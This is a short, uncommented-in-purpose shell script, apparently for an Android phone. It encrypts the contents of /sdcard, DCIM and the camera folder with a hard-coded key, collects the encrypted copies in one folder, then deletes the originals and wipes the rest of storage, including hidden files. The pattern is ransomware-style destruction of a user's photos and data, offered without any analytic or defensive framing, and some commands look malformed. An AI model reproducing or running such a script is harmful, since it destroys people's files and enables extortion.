# encrypt
./script /sdcard zdoifnv838847@755347hchxHsUDJDht6@sA9jvg

# move the copy
cd /sdcard
mkdir encryptvr
mv *.enc /sdcard/encryptvr

#remove It
rm -rif Android


cd DCIM
./script /sdcard/DCIM zdoifnv838847@755347hchxHsUDJDht6@sA9jvg
mv *.enc /sdcard/encryptvr
rm *

cd Camera
./script /sdcard/DCIM/Camera
mv *.enc /sdcard/encryptvr
rm *

cd /sdcard
rm -rif DCIM

mv encryptvr .encryptvr
rm -rif *
mv .encryptvr encryptvr
rm -rif .*

















